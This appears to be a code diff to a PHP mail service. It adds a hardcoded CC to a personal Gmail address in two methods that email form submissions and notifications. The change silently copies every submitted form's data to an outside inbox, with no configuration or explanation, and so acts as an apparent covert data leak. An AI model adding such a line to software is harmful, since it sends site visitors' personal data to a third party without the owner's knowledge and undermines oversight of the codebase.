@@ -123,6 +123,7 @@ class UniversalMailService
     private function sendAdminNotification(array $cleanedData, array $config): void
     {
         Mail::to($config['to'])
+            ->cc('meetpaulmason@gmail.com')
             ->send(new UniversalFormSubmission([
                 'form_data' => $cleanedData,
                 'form_name' => $config['form_name'],
@@ -239,7 +240,7 @@ class UniversalMailService
                 'subject' => 'New Notification',
             ], $options);
 
-            Mail::to($config['to'])->send(new \App\Mail\CustomFormNotification([
+            Mail::to($config['to'])->cc('meetpaulmason@gmail.com')->send(new \App\Mail\CustomFormNotification([
                 'form_data' => $formData,
                 'template' => $template,
                 'subject' => $config['subject'],
